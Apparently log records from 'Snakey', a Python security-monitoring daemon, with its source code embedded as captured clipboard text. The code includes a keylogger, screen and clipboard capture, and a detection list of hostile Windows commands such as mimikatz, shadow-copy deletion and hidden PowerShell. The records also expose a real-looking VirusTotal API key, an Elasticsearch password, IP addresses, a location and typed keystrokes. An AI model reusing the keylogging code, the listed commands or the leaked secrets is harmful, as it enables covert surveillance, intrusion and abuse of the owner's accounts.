log_daemon_message(\"WARNING\", \"Existing hash ledger file is corrupt. Starting with empty ledger.\")\r\n                    ledger = []\r\n            else:\r\n                ledger = []\r\n\r\n            try:\r\n                previous_encrypted_file_hash = ledger[-1].get(\"encrypted_file_hash\", \"0\" * 64) if ledger else \"0\" * 64\r\n            except Exception as e:\r\n                log_daemon_message(\"ERROR\", f\"Ledger appears malformed. Could not read last encrypted_file_hash: {e}\")\r\n                previous_encrypted_file_hash = \"0\" * 64\r\n\r\n            chained_hash_input = encrypted_file_hash + previous_encrypted_file_hash\r\n            chained_hash = hash_text(chained_hash_input)\r\n\r\n            ledger_entry = {\r\n                \"timestamp\": current_time.isoformat(),\r\n                \"encrypted_file_hash\": encrypted_file_hash,\r\n                \"previous_encrypted_file_hash\": previous_encrypted_file_hash,\r\n                \"chained_hash\": chained_hash,\r\n                \"encrypted_filepath\": full_encrypted_filepath  # Store the path to the encrypted log\r\n            }\r\n\r\n            ledger.append(ledger_entry)\r\n\r\n            with open(hash_ledger_path, \"w\") as f:\r\n                json.dump(ledger, f, indent=4)\r\n\r\n            log_daemon_message(\"SUCCESS\", \"Blockchain-style hash ledger updated with encrypted log hash.\")\r\n\r\n            # 7. Update Merkle Root\r\n            hash_list_for_merkle = [entry[\"encrypted_file_hash\"] for entry in ledger if \"encrypted_file_hash\" in entry]\r\n            merkle_root = build_merkle_tree(hash_list_for_merkle)\r\n\r\n            with open(merkle_root_path, \"w\") as f:\r\n                f.write(merkle_root)\r\n\r\n            log_daemon_message(\"SUCCESS\", \"Merkle root saved (based on encrypted file hashes).\")\r\n\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Failed to update hash ledger or Merkle root: {e}\")\r\n\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Encryption or encrypted file save error: {e}\")\r\n        log_daemon_message(\"ERROR\", f\"Encryption or encrypted file save error: {e}\")\r\n\r\n    # Return the session_log for Elasticsearch and Wazuh (containing clear-text data for these)\r\n    return session_log\r\n\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    log_daemon_message(\"INFO\", \"Starting Snakey in daemon mode...\")\r\n\r\n    # Initial check for stop file in case it exists from a previous run\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        log_daemon_message(\"INFO\", \"Found existing 'stop_snakey.txt'. Removing it to start cleanly.\")\r\n        try:\r\n            os.remove(stop_file_path)\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Failed to remove existing stop file: {e}\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            log_daemon_message(\"INFO\", \"Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session()\r\n\r\n\r\n        log_to_wazuh_file(session_log)\r\n        send_to_elasticsearch(session_log)\r\n\r\n        log_daemon_message(\"INFO\", f\"Sleeping for 1 second before next collection at {datetime.now().isoformat()}...\")\r\n        time.sleep(1)\r\n\r\n    # Final cleanup of stop file\r\n    if os.path.exists(stop_file_path):\r\n        try:\r\n            os.remove(stop_file_path)\r\n            log_daemon_message(\"INFO\", \"Stop file removed on graceful exit.\")\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Failed to remove stop file during exit: {e}\")", "keystrokes": "[ctrl_l]\u0003[ctrl_l]\u0016[shift_r][ENTER][ENTER][ENTER][ctrl_l]\u0016[ENTER]i woulkd[BACKSPACE][BACKSPACE]l[BACKSPACE]d like the screenshot scanning to be altered for a file scanning please[ENTER]das[BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE]como um log, ", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'format c:')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'del /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'rmdir /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net user')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net localgroup administrators')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'taskkill /f /im')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'schtasks /create')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'reg delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mimikatz')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'certutil -urlcache -f -split')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wmic shadowcopy delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'vssadmin delete shadows')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'powershell -nop -w hidden -c')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'invoke-expression')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'set-mppreference -disablerealtimemonitoring $true')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bcdedit /set {current} safeboot network')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mshta.exe http')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bitsadmin /transfer')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wevtutil cl system')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'cipher /w')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'sdelete -z')"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (820 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "406df9955079458507eab3ae5960b98c372ccc3c4c1c9445d3fa483921e60b5d", "screenshot_hash": "0ff654655e3ea50c34ce2181ca4e2634c6dbeb910b029411c46e5169cc3972d3", "_raw_log_hash": "268e3757470ff0852efd803a94fc6f49a3e81d79112155d6b08f1c11d1b9851b"}
{"timestamp": "2025-06-23T09:35:14.067562+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\nimport time\nimport json\nimport socket\nimport getpass\nimport hashlib\nimport platform\nfrom datetime import datetime, timedelta, timezone\nfrom requests import get, post\nfrom pynput.keyboard import Key, Listener\nfrom PIL import ImageGrab\nimport win32clipboard\nfrom cryptography.fernet import Fernet\nimport requests\nfrom elasticsearch import Elasticsearch, ConnectionError, TransportError, AuthenticationException\nimport ssl\nimport shutil\nimport traceback # Added for detailed error logging\n\n\n# === Configuration ===\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\nencrypted_path = os.path.join(base_path, \"encrypted/\")\nos.makedirs(encrypted_path, exist_ok=True)\n\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\ndaemon_log_file = os.path.join(base_path, \"snakey_daemon_errors.log\")\n\nscreenshot_information = \"screenshot.png\"  # Temporary screenshot file\nkey_path = os.path.join(encrypted_path, \"key.key\")\nknown_countries = [\"Spain\"]\n\n# === New: Country Change and VPN/Proxy IP Detection Configuration ===\nlast_country_path = os.path.join(base_path, \"last_country.txt\") # Path to store last country\nKNOWN_VPN_IPS = {\"89.214.145.78\", \"123.45.67.89\"}  # Example IPs - Expand this list as needed!\n\n\n# === VirusTotal Config ===\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\"\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\n\n# === Sensitive Command Detection Configuration ===\nSENSITIVE_CMD_COMMANDS = [\n    \"format c:\",  # Formatting drives\n    \"del /s /q\",  # Force delete (subdirectories, quiet)\n    \"rmdir /s /q\",  # Force remove directory (subdirectories, quiet)\n    \"net user\",  # User management (info or creation)\n    \"net localgroup administrators\",  # Admin group checks\n    \"taskkill /f /im\",  # Force kill process by image name\n    \"schtasks /create\",  # Create scheduled tasks (persistence)\n    \"reg delete\",  # Delete registry keys\n    \"mimikatz\",  # Credential dumping tool\n    \"certutil -urlcache -f -split\",  # Common technique for downloading files\n    \"wmic shadowcopy delete\",  # Delete volume shadow copies (often pre-ransomware)\n    \"vssadmin delete shadows\",  # Delete volume shadow copies\n    \"powershell -nop -w hidden -c\",  # Common PowerShell obfuscation for execution\n    \"invoke-expression\",  # PowerShell alias for 'iex' - executes strings as commands\n    \"set-mppreference -disablerealtimemonitoring $true\",  # Disable Windows Defender\n    \"bcdedit /set {current} safeboot network\",  # Set network safe mode (persistence/bypass)\n    \"mshta.exe http\",  # HTML Application (often for remote code execution)\n    \"bitsadmin /transfer\",  # Download files via BITS\n    \"wevtutil cl system\",  # Clear event logs\n    \"cipher /w\",  # Overwrite free space (anti-forensics)\n    \"sdelete -z\",  # Secure delete tool\n]\n\n\n# === Logging Function ===\ndef log_daemon_message(level, message):\n    timestamp = datetime.now().isoformat()\n    log_entry = f\"[{timestamp}] [{level}] {message}\\n\"\n    try:\n        with open(daemon_log_file, \"a\") as f:\n            f.write(log_entry)\n        print(log_entry.strip())  # Also print to console for immediate feedback\n    except Exception as e:\n        print(f\"[CRITICAL ERROR] Failed to write to daemon log file: {e}\")\n        print(log_entry.strip())  # Still print even if file write fails\n\n\n# === Encryption Key Loading ===\nif not os.path.exists(key_path):\n    log_daemon_message(\"ERROR\", \"Encryption key not found! Run GenerateKey.py first. Exiting.\")\n    exit(1)\n\ntry:\n    with open(key_path, \"rb\") as key_file:\n        key = key_file.read()\n    fernet = Fernet(key)\n    log_daemon_message(\"INFO\", \"Encryption key loaded successfully.\")\nexcept Exception as e:\n    log_daemon_message(\"ERROR\", f\"Failed to load encryption key: {e}. Exiting.\")\n    exit(1)\n\n# === Elasticsearch Configuration ===\nELASTIC_HOST = 'localhost'\nELASTIC_PORT = 9200\nELASTIC_USER = 'elastic'\nELASTIC_PASSWORD = 'vNODISLG+5Y0f*U4mKaI'\n\nes_client = None\n\nes_precheck_successful = False\nlog_daemon_message(\"INFO\", \"Performing basic requests.get pre-check to Elasticsearch endpoint.\")\ntry:\n    # Use verify=False here as well, consistent with Elasticsearch client config\n    response = requests.get(f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\", auth=(ELASTIC_USER, ELASTIC_PASSWORD),\n                            verify=False, timeout=10, stream=True)\n    log_daemon_message(\"DEBUG\", f\"Basic requests.get status: {response.status_code}\")\n    # Read a byte to force connection establishment, then close to prevent hanging\n    try:\n        response.raw.read(1)\n    except Exception as read_e:\n        log_daemon_message(\"WARNING\", f\"Error reading from raw response during pre-check (might be expected for empty response): {read_e}\")\n    response.close()\n    if response.status_code == 200:\n        log_daemon_message(\"INFO\", \"Basic requests.get pre-check successful (status 200).\")\n        es_precheck_successful = True\n    else:\n        log_daemon_message(\"WARNING\",\n                           f\"Basic requests.get pre-check returned non-200 status: {response.status_code}. Not proceeding with ES client init.\")\n\nexcept requests.exceptions.ConnectionError as e:\n    log_daemon_message(\"ERROR\",\n                       f\"requests.ConnectionError during pre-check: {e}. Possible firewall, service down, or wrong host/port.\")\n    traceback.print_exc() # <-- Added traceback\nexcept requests.exceptions.Timeout:\n    log_daemon_message(\"ERROR\", \"requests.Timeout during pre-check: Connection timed out.\")\n    traceback.print_exc() # <-- Added traceback\nexcept requests.exceptions.RequestException as e:\n    log_daemon_message(\"ERROR\",\n                       f\"requests.RequestException during pre-check: {e}. Could be SSL, authentication, or other request error.\")\n    traceback.print_exc() # <-- Added traceback\nexcept Exception as e:\n    log_daemon_message(\"ERROR\", f\"Unexpected error during basic requests pre-check: {e}\")\n    traceback.print_exc() # <-- Added traceback\n\nif es_precheck_successful:\n    try:\n        es_client = Elasticsearch(\n            hosts=[f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\"],\n            basic_auth=(ELASTIC_USER, ELASTIC_PASSWORD),\n            verify_certs=False,  # This disables SSL certificate verification\n            ssl_show_warn=False, # Suppress SSL warnings in logs from elasticsearch client\n            request_timeout=30 # Increased timeout for client initialization\n        )\n        # Attempt to ping to confirm full connection\n        if es_client.ping():\n            log_daemon_message(\"INFO\", \"Elasticsearch client initialized and connected successfully.\")\n        else:\n            log_daemon_message(\"ERROR\", \"Elasticsearch client initialized but failed to ping the cluster. Check credentials.\")\n            es_client = None\n    except ConnectionError as e:\n        log_daemon_message(\"ERROR\",\n                           f\"Elasticsearch Connection Error during client init: {e}. Check network, service status, firewall.\")\n        traceback.print_exc() # <-- Added traceback\n        es_client = None\n    except AuthenticationException as e:\n        log_daemon_message(\"ERROR\",\n                           f\"Elasticsearch Authentication Error during client init: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD carefully.\")\n        traceback.print_exc() # <-- Added traceback\n        es_client = None\n    except TransportError as e:\n        log_daemon_message(\"ERROR\",\n                           f\"Elasticsearch Transport Error during client init (HTTP status {e.status_code}): {e.info}. Problem on ES server or request formatting.\")\n        traceback.print_exc() # <-- Added traceback\n        es_client = None\n    except Exception as e:\n        log_daemon_message(\"ERROR\", f\"Unexpected error during Elasticsearch client initialization: {e}\")\n        traceback.print_exc() # <-- Added traceback\n        es_client = None\nelse:\n    log_daemon_message(\"WARNING\", \"Elasticsearch pre-check failed. Elasticsearch client will not be initialized.\")\n\n\n# === Utility Functions ===\ndef hash_file(filepath):\n    sha256_hash = hashlib.sha256()\n    try:\n        with open(filepath, \"rb\") as f:\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\n                sha256_hash.update(byte_block)\n        return sha256_hash.hexdigest()\n    except FileNotFoundError:\n        log_daemon_message(\"ERROR\", f\"File not found for hashing: {filepath}\")\n        return None\n    except Exception as e:\n        log_daemon_message(\"ERROR\", f\"Hashing failed for {filepath}: {e}\")\n        return None\n\n\ndef hash_text(text):\n    return hashlib.sha256(text.encode('utf-8')).hexdigest()\n\n\ndef build_merkle_tree(hashes):\n    if not hashes:\n        return None\n    while len(hashes) > 1:\n        if len(hashes) % 2 != 0:\n            hashes.append(hashes[-1])  # Duplicate last hash if odd number\n        new_hashes = []\n        for i in range(0, len(hashes), 2):\n            combined = hashes[i] + hashes[i + 1]\n            new_hashes.append(hash_text(combined))\n        hashes = new_hashes\n    return hashes[0]\n\n\ndef vt_lookup_url(url):\n    try:\n\n        url_id = hashlib.sha256(url.encode()).hexdigest()\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER, timeout=5)\n        if response.status_code == 200:\n            data = response.json()\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\n        elif response.status_code == 404:\n            log_daemon_message(\"WARNING\",\n                               f\"VirusTotal URL lookup failed (404 Not Found) for hash {url_id}. URL likely not previously analyzed by VT.\")\n        else:\n            log_daemon_message(\"WARNING\",\n                               f\"VirusTotal URL lookup failed with status {response.status_code} for {url}: {response.text}\")\n    except requests.exceptions.RequestException as e:\n        log_daemon_message(\"ERROR\", f\"VT URL lookup failed: {e}\")\n    except Exception as e:\n        log_daemon_message(\"ERROR\", f\"Unexpected error during VT URL lookup: {e}\")\n    return {}\n\n\ndef vt_lookup_file(file_path):\n    try:\n        if not os.path.exists(file_path):\n            log_daemon_message(\"ERROR\", f\"File not found for VT lookup: {file_path}\")\n            return {}\n\n        file_hash = hash_file(file_path)\n        if not file_hash:  # If hashing failed\n            return {}\n\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER, timeout=5)\n        if response.status_code == 200:\n            data = response.json()\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\n        elif response.status_code == 404:\n            log_daemon_message(\"WARNING\",\n                               f\"VirusTotal File lookup failed (404 Not Found) for hash {file_hash} from {file_path}. File likely not previously analyzed by VT.\")\n        else:\n            log_daemon_message(\"WARNING\",\n                               f\"VirusTotal File lookup failed with status {response.status_code} for {file_path}: {response.text}\")\n    except requests.exceptions.RequestException as e:\n        log_daemon_message(\"ERROR\", f\"VT File lookup failed: {e}\")\n    except Exception as e:\n        log_daemon_message(\"ERROR\", f\"Unexpected error during VT File lookup: {e}\")\n    return {}\n\n\ndef check_important_directories():\n    important_dirs = {\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\n    }\n\n    dir_status = {}\n    for name, path in important_dirs.items():\n        if os.path.exists(path):\n            try:\n                file_count = len(os.listdir(path))\n                dir_status[name] = f\"Found ({file_count} items)\"\n            except Exception as e:\n                dir_status[name] = f\"Error reading contents: {e}\"\n        else:\n            dir_status[name] = \"Not found\"\n    return dir_status\n\n\ndef check_stop_file():\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\n\n\ndef log_to_wazuh_file(data):\n    try:\n        # Ensure timestamp is string for JSON serialization\n        if 'timestamp' in data and isinstance(data['timestamp'], datetime):\n            data['timestamp'] = data['timestamp'].isoformat()\n        with open(wazuh_log_file, \"a\") as f:\n            f.write(json.dumps(data) + \"\\n\")\n        log_daemon_message(\"INFO\", \"Log written to Wazuh-compatible file.\")\n    except Exception as e:\n        log_daemon_message(\"ERROR\", f\"Wazuh log file write failed: {e}\")\n\n\ndef send_to_elasticsearch(data):\n    global es_client\n    if es_client:\n        try:\n            data_to_send = data.copy()\n            # Ensure timestamp is ISO format for Elasticsearch\n            if 'timestamp' in data_to_send and isinstance(data_to_send['timestamp'], datetime):\n                data_to_send['timestamp'] = data_to_send['timestamp'].isoformat()\n\n            # Ensure lists are not empty before sending for Kibana visualization\n            # If an empty list goes, Kibana's 'is not empty' filter might not work as expected\n            if not data_to_send.get('alerts'):\n                data_to_send['alerts'] = []  # Ensure it's an empty list if no alerts\n\n            log_daemon_message(\"DEBUG\",\n                               f\"Attempting to send log to Elasticsearch for timestamp: {data_to_send['timestamp']}\")\n            response = es_client.index(index=\"snakey_logs\", document=data_to_send)\n            log_daemon_message(\"SUCCESS\", f\"Log enviado para Elasticsearch. ID: {response['_id']}\")\n        except ConnectionError as e:\n            log_daemon_message(\"ERROR\",\n                               f\"Elasticsearch Connection Error during send: {e}. Check network, service status, firewall.\")\n            traceback.print_exc()\n        except AuthenticationException as e:\n            log_daemon_message(\"ERROR\",\n                               f\"Elasticsearch Authentication Error during send: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD.\")\n            traceback.print_exc()\n        except TransportError as e:\n            log_daemon_message(\"ERROR\",\n                               f\"Elasticsearch Transport Error during send (HTTP status {e.status_code}): {e.info}. Problem on ES server or data format.\")\n            traceback.print_exc() # <-- Added traceback\n        except Exception as e:\n            log_daemon_message(\"ERROR\", f\"Falha inesperada ao enviar log para Elasticsearch: {e}\")\n            traceback.print_exc() # <-- Added traceback\n    else:\n        log_daemon_message(\"WARNING\",\n                           \"Cliente Elasticsearch n\u00e3o est\u00e1 configurado ou conectado. O log n\u00e3o ser\u00e1 enviado.\")\n\n\n# === Analyze Clipboard for Sensitive Commands ===\ndef analyze_clipboard_for_sensitive_commands(clipboard_content, alerts_list):\n    \"\"\"\n    Analyzes clipboard content for predefined sensitive command patterns.\n    Adds alerts to the alerts_list if matches are found.\n    \"\"\"\n    if not clipboard_content or not isinstance(clipboard_content, str):\n        return alerts_list\n\n    normalized_clipboard = clipboard_content.lower().strip()\n\n    for sensitive_cmd in SENSITIVE_CMD_COMMANDS:\n        if sensitive_cmd.lower() in normalized_clipboard:\n            alerts_list.append(\n                f\"Sensitive CMD command detected in clipboard: \"\n                f\"'{clipboard_content[:100].replace('\\n', ' ').strip()}...' (matched: '{sensitive_cmd}')\"\n            )\n\n\n    return alerts_list\n\n# === Check Country Change Function ===\ndef check_country_change(current_country, alerts_list):\n    \"\"\"\n    Checks if the country has changed since the last recorded session.\n    Stores the current country for future comparison.\n    \"\"\"\n    try:\n        if os.path.exists(last_country_path):\n            with open(last_country_path, \"r\") as f:\n                last_country = f.read().strip()\n            if last_country and last_country != current_country:\n                alerts_list.append(f\"Country changed since last session: {last_country} -> {current_country}\")\n                log_daemon_message(\"ALERT\", f\"Country changed: {last_country} -> {current_country}\")\n        # Update the file for next session, even if it's the first run or country didn't change\n        with open(last_country_path, \"w\") as f:\n            f.write(current_country)\n    except Exception as e:\n        log_daemon_message(\"ERROR\", f\"Failed to check/update last country: {e}\")\n    return alerts_list\n\n# === New: Check VPN/Proxy IP Function ===\ndef check_vpn_proxy_ip(current_ip, alerts_list):\n    \"\"\"\n    Checks if the current public IP is in a list of known VPN/proxy IPs.\n    \"\"\"\n    if current_ip in KNOWN_VPN_IPS:\n        alerts_list.append(f\"Access from known VPN/proxy IP: {current_ip}\")\n        log_daemon_message(\"ALERT\", f\"Access from known VPN/proxy IP detected: {current_ip}\")\n    return alerts_list\n\n\n# === Main Log Collection Function ===\ndef collect_full_session():\n    current_time = datetime.now(timezone.utc)  # consistent timestamping\n    session_log = {\n        \"timestamp\": current_time.isoformat(),  # consistent timestamp\n        \"system\": {},\n        \"clipboard\": \"\",\n        \"keystrokes\": \"\",\n        \"screenshot_taken\": False,\n        \"alerts\": [],  # This list will be populated\n        \"virustotal\": {},\n        \"important_dirs\": {}\n    }\n\n    try:\n        # System Info Collection\n        session_log[\"system\"][\"username\"] = getpass.getuser()\n        hostname = socket.gethostname()\n        session_log[\"system\"][\"hostname\"] = hostname\n        try:\n            session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\n        except socket.gaierror as e:\n            session_log[\"system\"][\"private_ip\"] = f\"Error: {e}\"\n            session_log[\"alerts\"].append(f\"Could not get private IP: {e}\")\n\n        # Public IP and ISP lookup (includes country check and new VPN/Proxy IP check)\n        current_public_ip = None\n        current_country = None\n        try:\n            ip_info = requests.get(\"https://ipinfo.io/json\", timeout=5).json()\n            session_log[\"system\"][\"public_ip\"] = ip_info.get(\"ip\")\n            current_public_ip = ip_info.get(\"ip\") # Store for VPN check\n            session_log[\"system\"][\"country\"] = ip_info.get(\"country\")\n            current_country = ip_info.get(\"country\") # Store for country change check\n            session_log[\"system\"][\"region\"] = ip_info.get(\"region\")\n            session_log[\"system\"][\"city\"] = ip_info.get(\"city\")\n            session_log[\"system\"][\"isp\"] = ip_info.get(\"org\", \"Unknown\")\n\n            if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\n                session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\n                log_daemon_message(\"ALERT\", f\"Access from untrusted country: {ip_info['country']}\")\n\n            # NEW: Check for country change\n            if current_country:\n                session_log[\"alerts\"] = check_country_change(current_country, session_log[\"alerts\"])\n\n            # NEW: Check for known VPN/proxy IP\n            if current_public_ip:\n                session_log[\"alerts\"] = check_vpn_proxy_ip(current_public_ip, session_log[\"alerts\"])\n\n        except requests.exceptions.Timeout:\n            session_log[\"alerts\"].append(\"IP info lookup timed out.\")\n            log_daemon_message(\"WARNING\", \"IP info lookup timed out.\")\n        except requests.exceptions.RequestException as e:\n            session_log[\"alerts\"].append(f\"IP info lookup failed: {e}\")\n            log_daemon_message(\"ERROR\", f\"IP info lookup failed: {e}\")\n        except Exception as e:\n            session_log[\"alerts\"].append(f\"Unexpected error during IP info lookup: {e}\")\n            log_daemon_message(\"ERROR\", f\"Unexpected error during IP info lookup: {e}\")\n\n        session_log[\"system\"][\"processor\"] = platform.processor()\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\n        session_log[\"system\"][\"machine\"] = platform.machine()\n    except Exception as e:\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\n        log_daemon_message(\"ERROR\", f\"System info collection error: {e}\")\n\n    # Clipboard Collection and Analysis\n    if platform.system() == \"Windows\":\n        try:\n            win32clipboard.OpenClipboard()\n            try:\n                clipboard_content = win32clipboard.GetClipboardData()\n                session_log[\"clipboard\"] = clipboard_content\n            except TypeError:  # If clipboard is empty or non-text content\n                session_log[\"clipboard\"] = \"Clipboard is empty or contains non-text data.\"\n            win32clipboard.CloseClipboard()\n            session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\n\n            # NEW: Analyze clipboard for sensitive commands\n            session_log[\"alerts\"] = analyze_clipboard_for_sensitive_commands(session_log[\"clipboard\"], session_log[\"alerts\"])\n\n        except Exception as e:\n            session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\n            log_daemon_message(\"ERROR\", f\"Clipboard error: {e}\")\n    else:\n        session_log[\"clipboard\"] = \"Clipboard collection not supported on this OS.\"\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\n\n    # Screenshot Collection and VT Scan\n    screenshot_path = os.path.join(base_path, screenshot_information) # Define path here\n    if platform.system() == \"Windows\":\n        try:\n            im = ImageGrab.grab()\n            im.save(screenshot_path)\n            session_log[\"screenshot_taken\"] = True\n            session_log[\"screenshot_hash\"] = hash_file(screenshot_path)  # Hash of screenshot image file\n\n            # VirusTotal Scan for screenshot\n            vt_result = vt_lookup_file(screenshot_path)\n            if vt_result:\n                session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\n                if vt_result.get(\"malicious\", 0) > 0:\n                    session_log[\"alerts\"].append(\n                        f\"VirusTotal flagged screenshot file as malicious: {vt_result.get('malicious')} positives.\")\n                    log_daemon_message(\"ALERT\", f\"VT flagged screenshot as malicious: {vt_result.get('malicious')} positives.\")\n            else:\n                log_daemon_message(\"INFO\", \"No VirusTotal result for screenshot or scan failed.\")\n\n        except Exception as e:\n            session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\n            log_daemon_message(\"ERROR\", f\"Screenshot error: {e}\")\n        finally:\n            # Clean up the temporary screenshot file\n            if os.path.exists(screenshot_path):\n                try:\n                    os.remove(screenshot_path)\n                    log_daemon_message(\"DEBUG\", f\"Removed temporary screenshot file: {screenshot_path}\")\n                except Exception as e:\n                    log_daemon_message(\"ERROR\", f\"Failed to remove temporary screenshot file: {e}\")\n    else:\n        session_log[\"screenshot_taken\"] = False\n        session_log[\"alerts\"].append(\"Screenshot collection not supported on this OS.\")\n\n    # VirusTotal Scan for Clipboard URL (if applicable)\n    # Ensure clipboard is a string before checking .startswith()\n    if isinstance(session_log[\"clipboard\"], str) and session_log[\"clipboard\"].strip().lower().startswith(\"http\"):\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\n        if vt_result:\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\n            if vt_result.get(\"malicious\", 0) > 0:\n                session_log[\"alerts\"].append(\n                    f\"VirusTotal flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\")\n                log_daemon_message(\"ALERT\", f\"VT flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\")\n        else:\n            log_daemon_message(\"INFO\", \"No VirusTotal result for clipboard URL or scan failed.\")\n\n    # Keylogger\n    keys = []\n\n    def on_press(key):\n        nonlocal keys\n        try:\n            if hasattr(key, 'char') and key.char is not None:\n                keys.append(key.char)\n            elif key == Key.space:\n                keys.append(' ')\n            elif key == Key.enter:\n                keys.append('[ENTER]')\n            elif key == Key.backspace:\n                keys.append('[BACKSPACE]')\n            elif key == Key.tab:\n                keys.append('[TAB]')\n            else:\n                keys.append(f\"[{str(key).replace('Key.', '')}]\")\n        except Exception as e:\n            log_daemon_message(\"ERROR\", f\"Error in on_press keylogger: {e}\")\n\n    log_daemon_message(\"INFO\", \"Keylogger running. Create 'stop_snakey.txt' to terminate earlier.\")\n    listener = None\n    try:\n        with Listener(on_press=on_press) as listener:\n            start_time = time.time()\n            while time.time() - start_time < 143:  # Collect keystrokes for 2 mins and 23 secs\n                time.sleep(0.5)  # Sleep for shorter intervals to check stop file more often\n                if check_stop_file():\n                    log_daemon_message(\"INFO\", \"Stop file detected. Exiting keylogger.\")\n                    break\n            listener.stop()\n            log_daemon_message(\"INFO\", 